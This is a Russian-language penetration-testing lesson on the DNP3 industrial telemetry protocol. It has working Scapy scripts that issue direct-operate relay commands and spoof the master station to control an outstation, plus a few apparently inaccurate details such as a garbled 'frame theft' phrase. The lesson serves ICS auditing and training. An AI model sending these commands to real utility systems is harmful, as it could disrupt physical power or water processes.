---
id: hardware-dnp3
title: "DNP3: протокол энергетики"
category: hardware
parent: hardware-mod-ics-protocols
difficulty: hard
order: 1
tags: [dnp3, ics, scada, energy]
prerequisites: [hardware-modbus-deep, hardware-ics]
useful_for:
  - "Пентест АСУ ТП и энергетики"
  - "Аудит OT-сетей и телеметрии"
  - "CTF Hardware/ICS"
estimated_minutes: 55
summary: "DNP3 изнутри: модель объектов, функции, режимы Unsolicited/Class, Secure DNP3 (SAv2/SAv5), типовые ошибки и практические команды чтения/управления outstation."
---

**DNP3** (Distributed Network Protocol 3) — протокол телеметрии, созданный для электроэнергетики и водоснабжения. Он связывает **master** (главную станцию, SCADA/RTU-концентратор) с **outstation** (удалённым терминалом на объекте). В отличие от Modbus, DNP3 имеет формальную модель данных, поддержку событий, времени и — опционально — криптографической аутентификации. Но на практике «защищённый» режим почти никогда не включён, а legacy-инсталляции десятилетиями работают без него. Этот урок — практический разбор DNP3 для пентестера OT.

## Зачем DNP3, а не Modbus

Modbus — регистровая модель без времени и событий. Энергетике нужны:

- **События (events)** — outstation сам присылает изменения, а не ждёт опроса.
- **Метки времени** — для точного анализа аварий.
- **Классы данных (Class 0–3)** — приоритизация опроса.
- **Подтверждения и повторные передачи** — надёжность на плохих каналах (радио, PLC).
- **Коды качества (quality flags)** — «значение достоверно / устарело / недостоверно».

Эти возможности делают DNP3 ближе к полноценному прикладному протоколу, чем Modbus, но одновременно добавляют поверхность атаки.

## Стек и транспорт

DNP3 определяет три уровня: **Data Link**, **Transport** и **Application**. Работает поверх TCP (обычно порт **20000**), UDP или последовательной линии (RS-232/RS-485). В TCP применяется кража кадров (link-layer frames) с заголовком `0x0564` (start), length, control, destination и source адресами (16 бит).

| Уровень | Что делает | Поля |
|---------|-----------|------|
| Data Link | кадрирование, CRC, адресация | START 0x0564, LEN, CTRL, DEST, SRC, CRC |
| Transport | сегментация/сборка | FIR, FIN, SEQ |
| Application | функции и объекты | APP CTRL, FC, IIN, объекты |

Адрес назначения (DNP3 address, 0–65519) — это «кто есть кто»: у master обычно 1–10, у outstation — свой номер. Ошибка в адресе = команда уходит не туда.

## Модель объектов и функции

DNP3 описывает данные как **объекты** с **группами** и **вариациями**. Каждая группа — тип данных:

| Группа | Тип данных |
|--------|-----------|
| 1 | Binary Input (двухпозиционный вход) |
| 10 | Binary Output (команда) |
| 20 | Counter |
| 30 | Analog Input |
| 40 | Analog Output |
| 50 | Time and Date |
| 60 | Class objects |
| 80 | Internal Indications |

Функции прикладного уровня (Function Code, FC) задают действие:

| FC | Имя | Смысл |
|----|-----|-------|
| 1 | READ | прочитать объекты |
| 2 | WRITE | записать объекты |
| 3 | SELECT | «выбрать» перед управлением |
| 4 | OPERATE | выполнить операцию |
| 5 | DIRECT_OPERATE | выполнить сразу |
| 6 | DIRECT_OPERATE_NR | без подтверждения |
| 13/14 | COLD/WARM_RESTART | перезапуск outstation |
| 20 | ENABLE_UNSOLICITED | вкл. спонтанные события |
| 21 | DISABLE_UNSOLICITED | выкл. |
| 24 | ASSIGN_CLASS | назначить классы |
| 129 | RESPONSE | ответ |

Самое интересное для атакующего: **DIRECT_OPERATE (5)** и **DIRECT_OPERATE_NR (6)** — они выполняют команду немедленно, без предварительного SELECT. Именно ими открывают/закрывают выключатели и меняют уставки.

## IIN — Internal Indications

Каждый ответ содержит два байта **IIN** (Internal Indications). Они говорят о состоянии outstation:

| Бит | Имя | Значение |
|-----|-----|----------|
| IIN1.0 | ALL_STATIONS | запрос ко всем |
| IIN1.1 | CLASS_1_EVENTS | есть события класса 1 |
| IIN1.2 | CLASS_2_EVENTS | события класса 2 |
| IIN1.3 | CLASS_3_EVENTS | события класса 3 |
| IIN1.4 | NEED_TIME | время не синхронизировано |
| IIN1.5 | LOCAL_CONTROL | локальное управление включено |
| IIN1.6 | DEVICE_TROUBLE | неисправность устройства |
| IIN1.7 | DEVICE_RESTART | устройство перезапускалось |
| IIN2.0 | NO_FUNC_CODE_SUPPORT | функция не поддержана |
| IIN2.1 | OBJECT_UNKNOWN | объект неизвестен |
| IIN2.2 | PARAMETER_ERROR | ошибка параметра |

`LOCAL_CONTROL` (IIN1.5) — критично: если он установлен, outstation **игнорирует команды управления из сети** (оператор на объекте перевёл переключатель в «местное»). `DEVICE_RESTART` и `NEED_TIME` — хорошие индикаторы, что устройство «свежее» и уязвимо к спуфингу времени.

## Практический инструментарий

| Инструмент | Назначение | Ключевые флаги |
|-----------|-----------|----------------|
| `nmap` NSE | обнаружение | `--script dnp3-info` |
| `dnp3` (pydnp3/opendnp3) | библиотека master/outstation | — |
| `scapy` (contrib.dnp3) | ручное формирование кадров | `DNP3()`, `DNP3Application()` |
| `Wireshark` | разбор | фильтр `dnp3` |
| `dnp3-master` (opendnp3) | CLI-мастер | `--master`, `--stack` |
| `Grassmarlin` | веб-клиент DNP3 | — |
| `Conpot` | honeypot | `--template default` |

### Обнаружение

```bash
# Пассивно: слушаем порт 20000
sudo tcpdump -i eth0 -n 'tcp port 20000' -w dnp3.pcap
# Активно: NSE-скрипт
nmap -p 20000 --script dnp3-info 10.0.0.0/24
```

Пример вывода `dnp3-info`:

```text
PORT      STATE SERVICE
20000/tcp open  dnp3
| dnp3-info:
|   Source Address: 1
|   Destination Address: 10
|_  Function Code: 129 (Response)
```

### Чтение объектов через Scapy

```python
from scapy.all import *
from scapy.contrib.dnp3 import *

# Инициализация соединения: кадр-запрос класса 0 (READ, группа 60, вар. 1)
req = (DNP3(src=1, dst=10)/
       DNP3Application(fc=1)/
       DNP3Obj(group=60, variation=1, prefix=0, count=1))
send(req)
```

Пример реального ответа с аналоговым входом:

```text
DNP3 / TCP 10.0.0.1 -> 10.0.0.2
  Application Control: FIR=1 FIN=1 CON=0 UNS=0 SEQ=3
  Function Code: RESPONSE (129)
  IIN: 0x0000
  Object: Group 30 Var 1 (Analog Input, 32-bit, flags)  Count=4
    [0] Value=234.5 Flags=0x01 (ONLINE)
    [1] Value=0.0   Flags=0x01
    [2] Value=12.75 Flags=0x01
    [3] Value=48.0  Flags=0x01
```

### Управление (ОСТОРОЖНО)

```python
# DIRECT_OPERATE без подтверждения (FC=6) — выполняется сразу
operate = (DNP3(src=1, dst=10)/
           DNP3Application(fc=6)/
           DNP3Obj(group=12, variation=1, prefix=0, count=1)/
           DNP3CROB(control=0x41, count=1, on_time=1000, off_time=0))
```

Здесь `control=0x41` — код операции «PULSE ON» (импульс включения). Команды управления меняют физический процесс; применять только в лаборатории или с письменным разрешением.

## Secure DNP3 (SAv2 / SAv5)

DNP3 имеет встроенную аутентификацию — **Secure Authentication**, версии **SAv2** (HMAC-SHA-1) и **SAv5** (более строгая, обязательная для новых развёртываний). Механика:

- **Challenge-response** на критичные операции (WRITE, SELECT, OPERATE).
- **Key Change** — смена сессионных ключей.
- **Pre-shared keys** или обновление через сертификаты.

Проблемы на практике:

- SA включён редко — производители включают по требованию.
- Ключи часто дефолтные или хранятся в открытом виде в конфиге.
- Переходный период: устройства работают в смешанном режиме, что даёт даунгрейд-атаки.

```bash
# Проверить, отвечает ли outstation на challenge (признак SA)
# В Wireshark: фильтр dnp3 && dnp3.al.func == 32 (AUTHENTICATE_REQ)
```

## Типовые ошибки конфигурации

- **Отключённая аутентификация** — команды управления проходят без пароля.
- **Слабые/дефолтные ключи** SAv2/SAv5, одинаковые на всех объектах.
- **Открытый порт 20000 в IT-сети** — прямой путь из корпоративной сети в OT.
- **Один DNP3-адрес на всех** — путаница и случайные команды.
- **Спуфинг master**: атакующий встаёт на место главной станции и рассылает команды.
- **DoS на канал**: flood кадрами вызывает перезагрузку слабых RTU.

## Разобранный пример: спуфинг master

```bash
# 1. Пассивно слушаем легитимный обмен, чтобы узнать адреса
sudo tcpdump -i eth0 -n 'tcp port 20000' -A -c 20
# ... видим: src=1 (master), dst=10 (outstation)
# 2. Прикидываемся master (src=1) и шлём команду управления
python3 - <<'PY'
from scapy.all import *
from scapy.contrib.dnp3 import *
pkt = (Ether()/IP(src="10.0.0.5", dst="10.0.0.10")/TCP(sport=51000, dport=20000)/
       DNP3(src=1, dst=10)/DNP3Application(fc=5)/
       DNP3Obj(group=12, variation=1, prefix=0, count=1)/
       DNP3CROB(control=0x41, count=1, on_time=1000, off_time=0))
sendp(pkt, iface="eth0")
PY
```

Если SA выключен, outstation примет команду от «master» с адресом 1, даже если реальный master — другой хост. Это классическая атака на телеметрию без аутентификации.

## Edge cases и подводные камни

- **Fragmenting**: большие ответы приходят несколькими кадрами (FIR/FIN), не парсите первый кадр как полный.
- **CRC на канале**: повреждённый CRC = кадр отброшен, но TCP уже доставил — не путайте с ошибкой приложения.
- **Unsolicited responses**: outstation может слать события сам — при пассивном анализе это не ответ на ваш запрос.
- **NEED_TIME + WRITE время (группа 50)**: спуфинг времени ломает анализ аварий; частая «тихая» атака.
- **LOCAL_CONTROL**: команды не пройдут — не думайте, что «сломалось».
- **Многопоточность master**: несколько master'ов на один outstation вызывают конфликты.

## Ссылочные таблицы

| Термин | Значение |
|--------|----------|
| Master | главная станция (SCADA) |
| Outstation | удалённый терминал (RTU) |
| IIN | Internal Indications (флаги состояния) |
| FC | Function Code |
| CROB | Control Relay Output Block |
| SAv2/SAv5 | Secure Authentication |
| Class 0 | статические данные |
| Class 1–3 | события по приоритету |

| Риск | Как проверить |
|------|---------------|
| Нет аутентификации | DIRECT_OPERATE без challenge |
| Открытый порт 20000 | nmap/сканирование |
| Дефолтные ключи SA | конфиг, Wireshark |
| Спуфинг master | смена src-адреса |

## Что дальше / решение

- Переходите к Ethernet-протоколам: `hardware-profinet-enip`.
- Нужна эксплуатация ПЛК → `hardware-plc-deep`.
- Базовый контекст OT → `hardware-ics`, `hardware-scada`.
- Нужен Modbus → `hardware-modbus-deep`.
- Нужен DNP3-стенд → `opendnp3` + `Conpot`.

## Квиз

```quiz
- question: "Какой порт по умолчанию использует DNP3 поверх TCP?"
  options:
    - "502"
    - "20000"
    - "102"
    - "44818"
  answer: 1
  explanation: "DNP3/TCP — порт 20000."
- question: "Что означает бит IIN1.5 LOCAL_CONTROL?"
  options:
    - "Устройство перезапускалось"
    - "Включено местное управление — сетевые команды игнорируются"
    - "Нет поддержки функции"
    - "События класса 1"
  answer: 1
  explanation: "LOCAL_CONTROL блокирует удалённое управление."
- question: "Какая функция DNP3 выполняет команду немедленно, без SELECT?"
  options:
    - "READ (1)"
    - "SELECT (3)"
    - "DIRECT_OPERATE (5)"
    - "ENABLE_UNSOLICITED (20)"
  answer: 2
  explanation: "DIRECT_OPERATE (5) выполняет операцию сразу."
- question: "Чем отличается DNP3 от Modbus?"
  options:
    - "Только портом"
    - "Есть события, метки времени, классы данных и опциональная аутентификация"
    - "Работает только по радио"
    - "Нет CRC"
  answer: 1
  explanation: "DNP3 богаче: события, время, качество, SA."
- question: "Что делает Secure DNP3 (SAv2/SAv5)?"
  options:
    - "Шифрует весь трафик TLS"
    - "Добавляет challenge-response аутентификацию для критичных операций"
    - "Меняет порт"
    - "Сжимает данные"
  answer: 1
  explanation: "SA защищает WRITE/SELECT/OPERATE через challenge-response."
```

## Где пригодится

- **Пентест:** аудит энергетики и водоснабжения.
- **CTF:** задачи Hardware/ICS по телеметрии.
- **Аудит:** проверка включён ли Secure DNP3.
- **Работа:** SOC/IR в промышленности, анализ инцидентов телеметрии.
- **Дальше по дереву:** `hardware-profinet-enip`, `hardware-plc-deep`.
